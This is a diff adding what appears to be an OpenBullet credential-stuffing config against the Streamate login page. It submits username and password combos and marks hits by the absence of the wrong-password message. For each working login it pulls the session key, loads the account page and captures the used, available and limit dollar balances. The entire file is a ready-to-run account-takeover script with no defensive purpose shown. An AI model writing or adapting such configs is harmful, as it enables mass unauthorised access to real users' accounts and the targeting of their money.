@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Streamate . ",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-13T01:37:37.4084312+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "https://www.streamate.com/login.php?langchoice=en" AutoRedirect=TRUE 
+  CONTENT "trylogin=1&tz_offset_minutes=-120&g=Lz9sYW5nY2hvaWNlPW5s&recognize=1&sausr=<USER>&sapwd=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://streamate.com/?langchoice=en" 
+  HEADER "Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7" 
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "We're sorry. Either the email address or your password is incorrect." 
+  KEYCHAIN Failure OR 
+    KEY "We're sorry. Either the email address or your password is incorrect." 
+#sakey PARSE "<COOKIES(sakey)>" LR "" "" Recursive=FALSE -> VAR "sakey" "" "" 
+#REDIRECT REQUEST GET "https://www.streamate.com/mymanage.php?langchoice=en&sakey=<sakey>&selectedSection=cinfo#js-limits" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Used PARSE "<SOURCE>" LR "Used:</strong>&nbsp;&#36;" "<" Recursive=FALSE -> CAP "Used" "$" "" 
+#Available PARSE "<SOURCE>" LR "Available:</strong>&nbsp;&#36;" "<" Recursive=FALSE -> CAP "Available" "$" "" 
+#Limit PARSE "<SOURCE>" LR "Limit:</strong>&nbsp;&#36;" "&" Recursive=FALSE -> CAP "Limit" "$" "" 
